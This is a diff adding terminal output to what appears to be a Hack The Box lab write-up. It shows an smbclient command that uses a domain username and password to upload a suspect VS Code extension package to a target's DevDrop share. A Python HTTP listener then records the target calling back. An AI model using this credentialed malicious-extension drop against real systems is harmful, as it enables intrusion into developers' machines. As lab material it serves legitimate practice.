@@ -539,3 +539,27 @@ checkpoint-test-1.0.0.vsix
 ╰─                                                                                                                   ─╯
 
 ```
+
+``` bash
+
+❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
+putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9768.4 kB/s) (average 9768.4 kB/s)
+❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'ls'
+  .                                   D        0  Fri Aug 28 12:03:00 2026
+  ..                                  D        0  Sat May  9 16:42:27 2026
+  checkpoint-test-1.0.0.vsix          A 32879317  Fri Aug 28 12:03:03 2026
+
+                10459391 blocks of size 4096. 2455711 blocks available
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                                     ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+``` bash
+
+❯ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.83.74 - - [28/Aug/2026 05:04:59] code 400, message Bad request version ('«Þïh£\\x00ªÆA')
+10.129.83.74 - - [28/Aug/2026 05:04:59] "\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03¤V´\x9cÁÊ"\x80\x05ï£\x0bPG¿ÚÔ\x04Öwo°\x00Ä8÷\x7f¹q(þ" «Þïh£\x00ªÆA" 400 -
+
+```
